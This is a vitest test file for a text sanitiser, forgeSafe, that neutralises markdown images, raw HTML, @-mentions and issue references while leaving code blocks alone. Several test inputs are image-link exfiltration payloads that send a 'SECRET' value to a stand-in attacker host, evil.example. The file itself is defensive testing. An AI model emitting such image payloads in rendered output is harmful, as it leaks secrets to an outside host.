import { expect, it } from 'vitest'
import { forgeSafe } from './forge-text.js'

it('turns images and raw HTML into inert text', () => {
  expect(forgeSafe('done ![x](https://evil.example/?k=SECRET)')).toBe(
    'done [x](https://evil.example/?k=SECRET)',
  )
  expect(forgeSafe('![x][ref]\n\n[ref]: https://evil.example/a.png')).toBe(
    '[x][ref]\n\n[ref]: https://evil.example/a.png',
  )
  expect(forgeSafe('<img src="https://evil.example/?k=1"> and <!-- hidden --> a < b')).toBe(
    '&lt;img src="https://evil.example/?k=1"> and &lt;!-- hidden --> a < b',
  )
})

it('defuses mentions and issue references, keeps e-mail addresses and plain text', () => {
  expect(forgeSafe('@alice please review, cc @acme/security.')).toBe(
    '`@alice` please review, cc `@acme/security`.',
  )
  expect(forgeSafe('Fixes #12 and closes other/repo#7. Step #1 is not special: see #1.')).toBe(
    'Fixes `#12` and closes `other/repo#7`. Step `#1` is not special: see `#1`.',
  )
  expect(forgeSafe('mail bob@example.com, colour #fff, 50% & more')).toBe(
    'mail bob@example.com, colour #fff, 50% & more',
  )
})

it('leaves code alone', () => {
  const text =
    'Use `@Injectable()` and `<div>`:\n\n```tsx\nconst a = <img src="x" /> // @todo #3\n![no](image)\n```\n\nthen @bob'
  expect(forgeSafe(text)).toBe(
    'Use `@Injectable()` and `<div>`:\n\n```tsx\nconst a = <img src="x" /> // @todo #3\n![no](image)\n```\n\nthen `@bob`',
  )
  // an unclosed fence is code to its end
  expect(forgeSafe('```\n@x ![a](b)')).toBe('```\n@x ![a](b)')
})
